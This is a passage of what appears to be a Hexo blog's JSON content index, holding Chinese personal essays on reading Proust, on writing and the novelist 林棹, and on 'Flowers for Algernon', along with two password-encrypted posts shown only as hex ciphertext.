就像从一个只装有蓝球和红球的袋子中拿出一个红球，就瞬间知道袋子里剩下的球是蓝色一样，我贫瘠的记忆中并不包含任何使我足以写出匹及普鲁斯特哪怕十分之一的文字来的成分。对自然的观察，空气中气味的捕捉，以及恐怖阅读量和对艺术的狂热喜爱，普鲁斯特的伟大是前无古人后无来者的。写下这些话前我没有查阅任何关于他的背景或者生平，单单凭着这一百多页的文字，我看到了真正的文艺。我甚至羞愧于与普鲁斯特产生的那么一丝丝的共鸣感，但这都不是什么重要的事了。</p>\n<p>​        在此之前，我对于传世的外国古典文学的认知主要来源于两方面，一方面是儿童启蒙时期被迫阅读的一些“世界名著”，另一方面就是这一年来读的一些思想较为悲观的哲学书籍或者日本文学。说来也好笑，我小时候抗拒于阅读任何一本所谓的名著，不论篇幅和国籍，甚至到高中后依然深以为傲，将其写入了作文，主题是“我真的不喜欢语文”。多亏我的语文老师算是一个见识相对高远的人，不知是欣赏我这幼稚的反骨，还是觉得我的文字功力尚且过关，给了我一个相当好看的分数，让本就有着莫名其妙自豪感的我更加沾沾自喜。</p>\n<p>​        我没有办法系统地评估“不喜欢读书”这件事给我带来的影响究竟是正面还是负面的。也许是正面的吧，正因为中学时代阅读量的匮乏，导致我疯狂地想要弥补，于是还愿意抽出那么一点点宝贵的时间，分给阅读这件事。</p>\n<p>​        说回我对于外国名著的印象，我读过的西方名著屈指可数，有印象的更是能够直接列举。去年看了《红与黑》、卡夫卡的《变形记》《城堡》以及一些短篇、荣格的《红书》和一些莫名其妙的哲学书比如《作为意志和表象的世界》，《悲剧的诞生》以及一些奇怪的拉康选集（以上的哲学书我通通我没有看完）。日本文学相对多一些，川端康成的经典中篇我看了两部，三岛由纪夫的代表作我基本都看过，村上春树只看过《挪威的森林》，渡边淳一那种我都不打算让他算数。</p>\n<p>​        为什么要列举，因为首先量确实很少，少到可以列举完全，其次， 你会发现这些书或多或少都印有时代悲伤的烙印，日本文学更甚。或是角色本身的悲剧，或是大时代历史的必然，寂寥悲伤的情绪总是挥之不去。</p>\n<p>​        然而追忆带给我的只有阳光灿烂的星期日，坐在后花园读书的孤独与自由的情绪。</p>\n<p>​        这种情绪带给我的是浓烈的新奇感以及吸引力，从来没有人能将干枯的日子描绘得如此多汁多味，连正午刺眼的阳光都变成了价值连城的金子。我最愿意形容将这样的文字形容为“自由的生命”，虽然也许主人公的童年是孤独的，但这样的孤独确实使我满足的。</p>\n<p>​        孤独不代表悲伤，相反，孤独也是能够享受的一种情绪，在之前的日子里我已经学会了如何享受痛苦，现在我要开始学习如何享受孤独了。</p>\n<p>​        「胡言乱语：谢谢慎也桑的安利。」</p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"冬","url":"/2022/12/18/%E5%B9%BB%E6%83%B3%E6%9B%B2-06-%E5%86%AC/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-NBcDrDBl\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>​        “好在，写作是一件非常特殊的事情。不管你经历了什么、绕了多远的路，甚至迷路，只要你重新回来，坐下，写，你经历的一切将成为你的矿脉。”</p>\n<p>​        作家林棹在「晶报·深港书评」的专访中这样谈到。</p>\n<h3><span id=\"1\">1</span></h3><p>​        近来无聊，于是重温了高中时候特别喜欢的小说，小说篇幅非常长，近百万字，且充斥大量文戏。以前看的时候专门挑其中好看的感情戏和打仗的场面看了，现在才后知后觉着本书厉害的正是我先前忽略的冗长的角色对谈，虽然如此，我也只能睡前看半小时，然后就困得不行了。</p>\n<p>​        我找到作者曾写过的随笔，而它将我击碎了。</p>\n<p>​        之前从非官方的渠道得知作者大学辍学专门写作，此人的地位瞬间在我心中平底起高楼，上升到了精神偶像层面。</p>\n<p>​        我以为这是作者在什么访谈中透露的消息，然而今天我发现，这些内容居然是写在随笔中的。</p>\n<p>​        那些文字寥寥几笔，轻松地讲述了作者经历的沉重往事，辍学，与父亲沟通，孤身前往陌生的城市，租房，赚钱，看海。</p>\n<p>​        然后把海边的日出纹在了手腕。</p>\n<p>​        高楼又倾塌了，伟岸的形象逐渐清晰成一个具体的、可视的形态。那一瞬间，作者与我好似近在咫尺，实际稍微想一想，则是远在天边。</p>\n<p>​        我想，文字中间蓬勃的生命力，或许原本就属于作者本人。而我，无论如何修饰我的词藻，表达方式，无论我肤浅地去读多少书，都没有办法习得所谓的生命力。这是与生俱来的，无可复制的。</p>\n<h3><span id=\"2\">2</span></h3><p>​        福楼拜讲，为了写作而生活。</p>\n<p>​        这话也是我从犄角旮旯里听来的，我也不是什么职业作家，也没有什么伟大的文学梦，就像青春期少女也会幻想成为聚光灯下的明星，我也幻想着能不能让我写出的文字稍微体面些。</p>\n<p>​        我在飞机上看了林棹的《流溪》，为此还损失掉了我的apple pencil，不过这都是后话了。实话实说，我没有看得太懂，阅读林棹的文字给我最直观的感受，就是像在参观什么现代主义的画展一般，观众着实能从中感到艺术的美，但是很难讲出什么所以然来。</p>\n<p>​        她为什么要这么写？</p>\n<p>​        这个答案对当时的我来说是没有任何意义的。</p>\n<p>​        我又回想起看追忆似水年华的夜晚，繁复的地名，欧洲古典诗歌，各色艺术家与缀满珍贵花纹的梦境叠织在一方打印纸中，却闻不到油墨的香味。只是梦幻的东西看太多容易审美疲劳，于是这也是为什么我用它来做睡前读物。</p>\n<p>​        此时此刻我没有水平去深究这些文字背后的轶事与所指，我只能关注于文字本身，体会单纯文字带给我的冲击力。</p>\n<p>​        这好吗？</p>\n<p>​        我突然觉得这不是一件好事，但是直到十五分钟前我都未曾这样想。</p>\n<p>​        幡然醒悟是一件很偶然的事情。这些年我已然将“文字”与“情感”割裂得太过彻底，尤其是面对一些内容晦涩的读物。但是没有作者的生活与极为私人的情感的铺垫，文字的所谓张力也只是无力的词藻堆砌，是灰暗而油腻的。</p>\n<p>​        我埋头于溢出厨余垃圾和洗脚水的下水道，随时随地等待着路边行人施舍的食物残渣，不懂什么是生命力，却想要写出具有生命力的文字。</p>\n<p>​        何为荒谬？这就是荒谬啊。    </p>\n<p>​        我不是卡夫卡，但任何困难都能将我击倒。</p>\n<p>​        为什么不呐喊呢？虽然此刻我只剩下了痛哭流涕的力气了。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"献给阿尔吉侬的花束","url":"/2023/02/11/%E8%AF%BB%E5%90%8E%E6%84%9F-%E7%8C%AE%E7%BB%99%E9%98%BF%E5%B0%94%E5%90%89%E4%BE%AC%E7%9A%84%E8%8A%B1%E6%9D%9F/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-OtpmLFFw\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<p>早上比平常晚起了三个小时，于是头疼了一整天，喝了两杯咖啡也无济于事，ppt学不进去，花了一个下午加一个晚上将近时把献给阿尔吉侬的花束看完了。</p>\n<p>作者通过查理塑造了人性的两个极端同时存在于一个个体上的情况—智能程度极高的同时情感能力极度缺乏。不同于人格分裂，聪明超过所有人的查理确乎是同时缺少爱的能力的，这样的个体会如何看待自己的人格，看待周围的人对待自己的态度，以及如何转变——进化？还是灭亡。这也是整本书最吸引我的兴趣点，我几乎是在对其主要内容毫无了解的情况下就开始了第一章的阅读，我当然不会说我对这本书最初的兴趣来源于诗一般的名字和拿不拿，不得不说对于深化fans royalty拿不拿有一手。</p>\n<p>以下是我看完以后的一些感想。</p>\n<p>第一点。</p>\n<p>文艺作品还是需要连贯的欣赏才能实现对创作者感情领悟的最大化。虽然我已经锻炼出“故事在任何地方被打断都不会抓心挠肺”的技能，但是我不得不承认这是一种迫于现实时间压力的无可奈何的妥协，也是对文学作品的试图表达的深刻情感的亵渎。这种技能以后最好还是用在一些无关痛痒的连续剧或者打发时间的网络小说上比较好。</p>\n<p>第二点。</p>\n<p>心智成熟的过程确实不是读多少本书就能够完成的，经历是必不可少的一环。感性的能力通常还是有家庭或者社会在长期的支撑中给予的，在这一环，聪明的查理正好一无所有。聪明的查理的梦境与幻觉中净是肮脏混乱童年与众人的嘲笑与戏弄，这些往事排山倒海般，在某个极短的时间内灌向聪明的查理，查理在绝对聪慧与绝对无情中，逐渐演化为了一头攻击性极强的怪兽。</p>\n<p>就如查理所说，如果没有人性情感的调和，智慧与教育根本毫无价值。</p>\n<p>很显然这是作者想要表达的核心观点之一，也是比较触动我的一个观点。</p>\n<p>小说很大程度上是借查理的变化来体现这个观点——查理绝顶聪明的同时却绝顶痛苦，从前没有人爱查理，便匆名后也没有人爱查理。不过至少从前的查理还是有爱别人的能力，但变聪明的他知晓了真相，便逐步主动地不再相信爱。</p>\n<p>对于查理来说，变聪明的手术只是使他换了一个痛苦的方式，甚至比过去加倍痛苦，对于周围的普通人来说，查理的变化不仅不是一件好事，反而使他们非常困扰，对于整个社会来说，由于查理几乎无法进行正常的社交，他的所有智慧很难发挥，贡献直接忽略不计，并且实验也侧面证明这个手术的现实意义并不是很大。</p>\n<p>当然全书花了三分之二的篇幅去描写查理的变化产生的负面影响，从而加深了读者对于查理变化背后原因的思考，即“如果没有人性情感的调和，智慧与教育根本毫无价值”。</p>\n<p>第三点。</p>\n<p>破而后立。</p>\n<p>查理破局的点，在于他终于有了学习爱的能力的意愿。即使残酷的现实如达摩克利斯之剑——查理不知道自己何时会如阿尔吉侬一样开始智商退化。</p>\n<p>查理开始进行实验，从而意图将“变聪明”的方法应用至全社会，实现真正的进步。虽然最后实现被证实目前没有现实意义，但“阿尔吉侬-高登效应”也推动了脑科学以及认知心理学的发展。</p>\n<p>从这个意义上看，查理虽然回到了弱智的状态，但最后时刻他还是找到了作为聪明的自己的人生意义，不再是那个只会傻笑，或者只会蔑视一切的高登了。虽然查理的人生高光如同昙花绽放般短暂，但好歹不完全是纯粹的痛苦与空虚，查理的心智究竟是在这半年中获得了成长——从一个完全不懂爱的邪恶者，变成了心怀世间，愿意珍视周围的人的善良者。</p>\n","categories":["AUDITION"],"tags":["万家灯火"]},{"title":"海","url":"/2023/01/23/%E5%B9%BB%E6%83%B3%E6%9B%B2-07-%E6%B5%B7/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"8a0b662d958f7da4ed2f1c4a2151af70d6619b9ef8f15bb7c66a21a6281f14e8\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5924955be49a19ed08f9194f97658d3c86e40b36723710f0d7754e3dc20484a343b50f78f964d0dd40cc3bd2f5ef8d473259b4855acb0a2cd2890fdfa150b24f77af1f486fd1a94b65ecd14785853b43342d93b2df18a119c8b269d96d1a99bb22a49e967d4eea2ae7ecf1a127af807c0ed066413f323cdf90043eb6d64b316f8e8a9b4a5d7c2a5bffaf50c20092564115defadc958af2918954b37db03344041369765149b0ccde6b4cb61e2a8c4dfa45684b5cbd5996d434706d966834f7dd17e875f2268d5bf7f8b8daaa250b4240cb9e773f51aec42b6d2ca9143e5071cb89c2d8d9b5281fd7c236ae40401726323d2bb8f2716d2b5ad93478361d8c30086a002c2bacea2732587a7bbe16947c9d14835fd88007b0b342b01f67767652fe644260528f827dbb57583220474785bbe7a1d38ede5b4eb72292e06ef4644ca6714dd43dbe49b320170f80ca6d3064c210fef514641fdb874edf2dbb2fff03ec96b06ebf3395972b4d73fac46f7b0684c4e2d8740a819a24c4934455f8e3ec04b3a4355ba4f150397c0b52a19dbdc653708a0870d58c49dca37fd7c9193748e17865c9fd5e08195f673aa1b4a29ad1fb72a894858ea7f19ac654f5a36168737061444ad39a2b9d238ff0ef6414c2b5eff7a3bf2256c87d5ff84c636c8ecd3934d36c489fab191db83a809e75f49b98d7a6d4987723e1a0cc448143809b68dae31bb4bf5bbeacf29ce6e83dd3ba529a512ccac225dffa23d857152bbc1530f85dadbfa41cd74a8b01caa5fd85b29073f7c65a4a99db25c127e477f7b9fd94d30fb9754ed424623677a773648d9b571ee8822bbaae8aad3ba8309590ded7aa145bc39502ad859adb19cded91a370c78c720e0a681d26a498fc2c44a995033b30134b80e066d2ccf3c4810c68480d5d38aff69cc9bcc1dc6acd34f50e4a3153458b58d06973bc92b368127fe8718c234bb285c53318852aec4b1ca6becd39059d8438035af4ee8bd2fb5cc62d104e0fc7999b4a187e0a800c4a4eace6aca892b7d777b5f79a1be6869a00ac6ae933115a1028a1acd6282375df3877375218154aca2fa510bb1c2a1829057aa30fee4acf5ee1076d9c95c8a112e4e2166563208a8eab531c6182f5e7081407a6de4be1c54c61d4ee7062c709bf43cc32b48df34de4126b0f5342bf78b7e91eadb5614fa1946efa1ce9d21d68899b0485b496fd73907db620f603e3cfeb8471b15c978b80104f7747f685509a99a8568a7946ca63204ac9d875c9ff94794a76c7695f37831d8bd9980d40e3dd2adf948206416e3b1c2c529058504a009277746e637ce825bcecc9561f319a9ffe77ec2e7996ae5b92d8cb8cea462ff6dd26c4caa67683a5ade411b8056444d9bf80e35080bb8d3421d049e3cf2233832716e2e1f2cd64247aa2c0410db93f99901682e714d40739698b903845e723e1b024555c90987d3383c5c550644b0e8d9f33c950af2ee458e77b4819005cc2c5c06e1c1e911b808f721062e0c3010e2cf0e70e95bb3b1540d94b03f922f3bf20c1e051c54c47147ad7438cd962e4805228e9c43904cc292c502689ad197b31a8d1bca3fe849f03d22692272ed301c7133fed37eac8cfea49c507d2a534189eb1927faaad6f0c492753e66b5cf7d512c4badf81a72fba47d60dcff5aaf3252a8411f373b7acbbbddfe4526a2182553119fe5f5714be78dfb1a7ab6c5f5319166fb11b876bbd4b5380f4ac055fe480efcd428a33f60a79668567aa635359248c91221cd9171cb9a3ff4375fc2780e80aec3ea7caa58319667d7f395d2eaccb5bc2abfc092b5808f6744b412f32042f2832bf992da28215603a86621f663ed4b9b2b033a79b0189e807e3f4625434a897721b863e04f476b12c630dd0457187ca3c1966c2c2204f475664806a14dbf9368d386d38865498023816021db3c8048659aa5ad7dda06192cf08aa7ff6a7f0653c57c50999bf4afb6dc6794391edfee635b51e858d9e3271cc126865b620646d7b4061d0d20e929a575d87b843a125328f6b1533d41255c68be0a99185d55ae56ec6f057a9c0b8a8db1ab095893efb24bf791504d6b6b0ac3e4940c88824b4f793f5778c2d23619b4b46cd8293f3a16cc68f47a6ca2c6f15be41e12b658ad56c2fa7ee906cf56af47d7dc9f07ff3c2aa5aca29084ccdb3c0a698916bdad2d50e2f9a55d6f2f0d1197cc6a6598142f9ba4491601f0a729f01965d4e01e31d71b9e5fbf47b7dd694a3933144c1fa11a8a3d70a26f3727125210b4046ee740e1dd7098f6625dd6e3fb5870a704479b579b5f88f7b963ad28983ee43a51331640640b23568cb06d04a34142d1eaab732e4feddea42e9b9b6679c851fcfc90d14b4e183d4b85e521c936754ad4c1a52d2df516c9b94a61885aff2e8372302ba5314a22413543069bcbfb731919948411f768841759a2476a5a69324a272f74987fa056d3d8ee4d03192d8014ec2a270c9b0b2eb1677cf6a767e4eec54f3b5d834a6ab479b0633e0f970c575751e9e6b315bb1a07de47dfe796684a168f5b17f97bbd028ec0fe036b9f4ea470f1302db6556c79b68f332fa080f2a020fd847179d2ea12c5824b21facef07d5bd8c960254efa5575100c87046d0384861a5a6d758ca50afdb6ba8e4f31bc7c0212cf3f9cfd2b68b98e615c70825c76d0b6ac49fe669c82922bbb4cb639c4114f52d143703d763d2f1c581b5fc7604e90decba4d4da2db88155c049c6c2727192946dbfb18901e135003834101a1fd85bea48f934972e542c3069aa0289d0ffd2b59ab827fd012a938eab3eedc074a01501f7a5ff08cb73295287b28d02dd322d1cbb6bda0a5b993cfda33d137d97cad72692ef03f0413ab34f6500cde981e00c5f18be5e9a8ed10d7330e881f3c444decf98bd7a2f1fbfa550e0cfd82aa294fe2b37aa240804f48636fd9d69c816a494ee1df4802a6c47da085f8b91616d098519d989e2547b683481624fd283ecc383fc7ba4380d4e299769fdcac68c2d4a32cb7d8f5a6cde853bd8b505e1b6efe319123e944f1e9b2f03addfc5783e0388b69b36ecee79f4b7158dcd94e7b272cf94d7d6b4fc7e831089cc83ebe082e2b88f8bebfe80ca4fadc0168b3bcf8fb0fad9d090ec7a3f521b6f45d661989d0906cc8ee43bb0d3f26682bec15746b2b8c39235276035217df3a47975778bef8a823682ba70427f8064ff86805f478503808a72367fe6cb4f67fa3861929fbf681d1295041ef95acd95dd46942639ade487f2ec7f6aca8e5586a8dc35b2fc3087294a28d139ea9c3f85d162eee11a06c7966bbf9ad6a5de7ec3937fe40bc142adab50316f19c098ebee69ede7ca4fab31025812058632cd612fe5597fdd4150f93f5f0a5ab027fc3e8bfe9c3110730d9b5e1fd33dce221e2a228620cf5e0c83686f185892d8a9004fb002e1766e30e973cabc53ee0e429ed2346c9e8ba0fc155530c47f9e3b99a03e13f123f14f76402330f0d356cad1f7b44a1ae64c413994157e3a0f9034782ff025981c9a2fbb149a9b0be9b000e176f827fdcb178ef921ad32eefcc3f556e635fa102eacba6568feeea82d6048c63ff2022c5c6d0010a4d346b1db6bc26f05eed819161d13ba41b49cdfb810e3e8edb7b696b88d576c0226ca73ca943b3cfadc5474fa9a1eef2812b4a9a82ae9f09c8add55d71173e26e2c11c73f525d3503dff6f584d6ca51449c88a3f239c736aa838aa59a5a37048e1e92767e5bda72e473cc8837cd70ef697507a6a6b22e6a47ce507b531765299c167bbb259168391095d9fc08bb81b4e5f5cbc791c048f8167e35eab42bd3a43ec199769074ff2bf0839ef6029685251cf90ffe7ae61aacf5bd12519d07d0bf7fbf49caecb48b5a842e6454414a55c67a05d8e953fe85dbd743d16516f7dfc1ac8e0686f258dec4ac1a3dfdd04f367630341e18587cdd203db066784b356a6d20b6be19ad7c7b2d8bca439a330e38be833c6cbe78495ce116109a8bb921fdf5a85f8de4bc05cbbc719b153798099d86685666dcf4ba251c908160ff48cddc02bd44f42a493b84d13619747f3d78cce7d0945d8c28a7ecd9a9f85b317d1814eef75e12222419b9d739318c4dd66a60e6de181c064b944c63048088b4fa523de4cd3bb99d2366f77d3cdd66b7c5a7ea3406014bf452d591e632ee69a929e66cece443fcd8b9999972729f4eea4b0775b14fdac60ac451e41452a1a78b5c84a3e6531e60864195423176ffade8819a27ea543880f890cba8698a1677c9c121fbdb4c8ad49ebcd4ff952ecee3aa0aa3813a8d85a83247db42652530b25e58ec9515043d14ddfb6f785be0bdb85457c8625e5f2dd766f4c571873ae1f94b1b858e44ef54fae2bfc12e78d705f72e45e12bbc862163cbded06cf552dadbccb352251ebbe57fbcd9bedf2df1f18cd0bb74f66efbe363a849c468e9308e6e50c06f991fe925c9a3eaaaa59455197b9d8a933bad13946cfecb2a15e36a27406a96bb1eed81315e5d7e19150f249cef8893b33d17a19aeb37fca3ba6a4b54700a85e6d72fb0a8eb68e2091426a3631d921d49effcd2b2879415dde53fc686917eb1c9290e70e5ca0544e6c29887ac8ccee64dfd1d45c876b386220db56e93ba62aa7f737588e515095021d711769139b4ee6d7f01f677f432b349d1959e3e0e3a1a0c39e0601f8b40f4741ef6d534efc4b07e4ce8127f3eb96f234b15fccd09ca3184f97118a0c06f14c3480ad609280ab3adeac048cb396810be45392511efaf7bcf63e5175ea6f6c0f6af522f6f8c72b790d4244f9420628ce78d9f0964246fa0a93d44c7f7d40b418a2b21beb456440bd592378401129079eadb1277fd2ca331dfda7a26a469838b09145baf779e2f825274a0509cea48ad2565bc481d0fbe8a9f6d08dc9a17143e152c9be89eb4fd416db35665ee0fd7cfe190d19a8f3afdc172e121a3ac0af6f7912804a1062c07fefb8e814d340148819c1555b9fe26d4cf34f921aad383afc52a2ec0928d7f0e28a4f5c5de5d462c81429ebaf824f480b26e1e18d55a0d6de285a5dd1ce0c5ff53ad93a720c503570e9ca5ead414b06dbee6b7f1e50a3ce278251fc4071d55f2b8dfc1b91aaa97ee4cc8705c2830773916478b9004f80a220e8287f4801441a17fee6e301b1ec5897d05df72900c9fe6cc21b5793a5156a9c6b6bb0b865f884dc5b472a0f16586b956ef59059fdb10cbc6189073b8062ef00af7b71ee6080ad5a40224310664dfd14a0c6f9444fc70996a0888741740328b58595d3a8c49a1608dfa6d2fd49b4d85dcc05af432106cf6f5fe2d4f6404b64ed800c0863d6186e4632212f0207aba9559a88a95629ad0143c9a322b78dd8bff741dbd77c9b2f1a2018b8e38572d48c397ec745d80b62c3e0a41e537cf2fd1a9950bbe3b7dbcdd161f08c50a9dfe0e456222da16c888db286d4d697715207d59d8bf946301d8386e5316de068c04dfa8df28f0478a52fa1c435c7aaf62c70327fb7dc249410629cae9501e1216ad81d7c6c05195dbb5a115220b61d9ac27727597612cf433790eaa4a1e725bcc52d23c1163081d01f83c82d2871ad42cfa12a03abb72bc7c8c47d0112bf455b8a3a6d798d09892de3c51c61bbae02587ac0ba6fe56c0e39b34d26d51792dda20131d8e851cc9062ec87e40556732bb885b86239a1968e3128d2c29218e8c2cef8f648c1aeddd10712e4a4f8b2278ac00002b747482926aa5a32534d4b8a66523f6f8107a7ee38b2f5de63114a08417fa8f6a7de4e3f5c7417de7fc456d3c809b0352cbf0f08d98ba18b5fc6a0f7735c0b2ca39ecfaa8aef5dc2285f87258994ed714146902e8323169066e8aefd8be9429de91427da2c21290e5c47fb5f6b045a51e8161b356a2999cb1d3a6e6fdf19312f8f2ff14cf6858688edc3f1c634bd01b74bdaae0e2ac099493860aa53b6993c3308c4c71ece8613d053f0d967effd8ef3f5163705ff7f543dc17b1be2d08038e0d342d0ab4f317a5747b09962e564f4b0c8392a567fd05087bc014733ef6319e0e9e6e93f40b25b2baff7da235c9eb993da3482459edfc105cb608017833b7cd97e84b35255ac447e84309ef322fa34b3376acd5fd29455fad242c54aaa00580f0cfa92305b2f41a28e775bd28465e453af604060c385bd196ed81568ac8ebf260c4e8b0b09c1b160b99cd5538f513ecc327ed5e174b9f1c54cb40e0d788961df039a7fdf435ef543c0683afc65c8b4e31f3b48925b0765d1d0bc79b6d4b9bdd20d2a519da9a03c7bf6a1b206eb7fd5b6a7dab2fc1649f8bd042cfaff61bfc28364839fed73e8ab681dbb147c7ee63e180bde478247a1f89f03630e44901d0919849be6f96fa11ed6bde84112bb432da122d44e0a5727827d60a591c7e41c6f97e7fc780ebecdf4ab44bd0ccac8441e074bebc33c33910d70354374045a83968be069cc65ee431c71e5aa7e416c0bfee472f216cd82d8cf8ce49392da9a88c7c157c0daafb66932dc6564950b1db4fe53723f9191ca1ccd1a5e494bdddfd02454c970c1471456901d85612a146f7e8189fbd5b0d73bd714ad5ad1d5c0ad7d2a09ae228a05a5ea514670692ad17c4dd8f5668c2ae52b44a54c4c88e69d47b55852684188a50a768b01dd1c8f081a1b32de6c0d85ec9f338e720b8196497fd226deea8282f88dec1b58ab7d9e7028051bd947423c1769861ec270c30aa76d942ad22efe43d22bc31540cd34e82d114ed45410f53443f4cf9a87a26cfa1abac0519ac3c30f6a3f979ca8edaa3601eae75753a082ca335805ddc3d16c8183b5c5e92ab6db5bd81f1b5c53fb49e559489c47c737febb754ffe2c69cc975924d870f2f059659</script>\n  <div class=\"hbe hbe-content\">\n    <div class=\"hbe hbe-input hbe-input-default\">\n      <input class=\"hbe hbe-input-field hbe-input-field-default\" type=\"password\" id=\"hbePass\">\n      <label class=\"hbe hbe-input-label hbe-input-label-default\" for=\"hbePass\">\n        <span class=\"hbe hbe-input-label-content hbe-input-label-content-default\">Hey, password is required here.</span>\n      </label>\n    </div>\n  </div>\n</div>\n<script data-pjax src=\"/lib/hbe.js\"></script><link href=\"/css/hbe.style.css\" rel=\"stylesheet\" type=\"text/css\">","categories":["AUDITION"],"tags":["幻想曲"]},{"title":"随记-001","url":"/2023/02/08/%E9%9A%8F%E8%AE%B0-001/","content":"<div class=\"hbe hbe-container\" id=\"hexo-blog-encrypt\" data-wpm=\"Oh, this is an invalid password. Check and try again, please.\" data-whm=\"OOPS, these decrypted content may changed, but you can still have a look.\">\n  <script id=\"hbeData\" type=\"hbeData\" data-hmacdigest=\"81861e33ba267f0c93c02d6f9ac5c3cb4b2c765871374c83df14206b0b4c1b78\">eb2486355afec2905c177304e33e4d63de2959dc1d08b82ea6cebd38b86e1e324dd1c1817b299deda1f1513a1eaf6e5713c4554eba8ef214fcdc66f085e1186fe51a8887c1409ec299b8c39577a0606d1284213de6bf0bc90a1eac91d23fc89adce79bb706c4974002d2db9ff96e9ff967ec891a25ce549fa6cd36484ddca8c5e6ee510b824a72145b9b2393ffc97f72851d9a89f8acc697b8934e2385ed8807745726f979069299622985182e841464da7c6ad26392206d0d3780c7621dfb2edc58d0b65be944fce573f69306ac5440985d20baf98455523e647f3c0783d4b35d315511d520152a57b0753043bb7383c1321044a1ffe3b1b86c0d33ad5de9b5ef1e84dea880a6382b7739b26a43c9b6325ec92c1b64fba80df2791ea234dd5776807307079a9c47feb565e99c2a1bf5924955be49a19ed08f9194f97658d3c87ecefe280521afc3c2758ff4321406c80163b36d95ef48e64db14bacf1456803af33476443bd2fa74b01ee249a8a74c7f6516d38b1a87f0d21a7d4d356eff242f38591dafe4587a1e5ab0573916ab8ca13d4202418a67e72ac83e8a08e466f986f1e6f61406e576d8f49010809dfc402a22e9918af3a4613caf6a865fdbc654bee3e8fb09500a2b5b04712f768313b514e0d866d4f377108e3f23396e8dfde2ebc4c271bdbe3698ccb301bbaf2a883e04201e19a65af4af715f00610772af0ab9e7013eeaf3ec5c7d3a8f41021f98d022c9863f189f78ec33bb3c7130872cbef9880519a00c879d6ccf6d2af8453cc4cc69c1ad43bb52abf587b1785b7f509fee471d3c96e3d829a6e1a6671b528dcd83f44e80fe7e26603afa548311cf58a188394942e39578fc50a5142078a352319e9b97152c9bd411f228ee7438d20464f2deff56bb5cdfddb9c2ea0b35214410e281b9e59597c111e71fe83cd2e5efd2cc7b4b885209e0660f801b48cd994c9a080af745bbbed702e5be132e71e5f4cd16d33df18bc62e7a6cf6e2316c3de70cbe11b3945539b888ae011253fa7cf27bea1bf32a52f633fd7e1e95ea6534639298d88d83fb41adba89eac7ee16a61c297f2794293afb5fbd3f3f9966a8b7f992e591190bae532c1900b1af1e3a2e17ec8a4e9357a86d2bc953441c77ff5adb735e129026200b9a6316b425535b2315ae331586b58bfff26df685de16dedcc26c503ea2f38c254f67b4d6038fcaf9e0e92c7bee29dda28a7e1190a98357f4eee0bbaee0a91f6184ad04e6bf8e6636647c2c07f99b73bdf81018136a5308da1e6499c7d4e0dab060aded90f89c8d20cb003884b33c937c797c4dbc401529efea97bf461b4c15c9180e6aa055276f3482cffc9eccebaba055061805d5f7655f9f83566590713dd141acc878a2bfe900396eb54aaac7ba536883882b7ee130eaa578c6b7b49acfcd3b1c68946ee7c042013f37d34fb1c2e1c5ecc59aa8b1530eb43e80dcbfb86853d0752cfcc47badff50e23876696bd57b598a2e817eadddbff9a5c27c1b0eb66d34e29d1fc6b5ee82794989ac0d957b6955cecbf5f2e787dac22fe4733dd04c3391803ef8f85a54ac303563ebfc89ce2bf42206b29b87cdaafc2f64131d62c9c208dea954b5f025770f4d70db25e2ef4383907bb6569a192fdf4cbb810a3c958ffd86d4bed7a5af1459b30e490c123586e7d67a6aa219657ddba393cb79532b5a1efd46dd80c3b60b343d929df2a2feccace856e4801384e2343ad6b580d1364290475e31d8ee416c236a4bfd63d872ef00c1c3a7e109cce7a26cff8541fb7dce5f341f1dc5e49d70251a5a19b272c343a1a31cee2bb817506d2efb9c9b6c28b6ea65ef6a6fdbc95a0db65f6e47230f0e0d2dacafff11d1ba7507a42bd4df6792f1a700bf1eedbd9d895c49bd316a5f6aba86c38c104cb73a386d8eb65b2bda869800fd39a090a8b798ce4e82dc12540f9886fd9f7d125816a6272abd1aeca8cb28dd91bbaf9fa8107b0f5e87ee6a8b4b199168612a663de2a2c2c640681067f51c289d068184a5ebb418ca4f51bb90600a8e3bf65d8fbd48f45a2c2a8451de8bfb889c81b8b008c76ecf5000feb9825e094e748129a79ed2e49d95d1c74771abbd3dbd2c7c9ecf41cd0c97587371a4a7207c813c2243a925e9aa7d091af1712891b0ea90d78286f024703421d8b91b66a3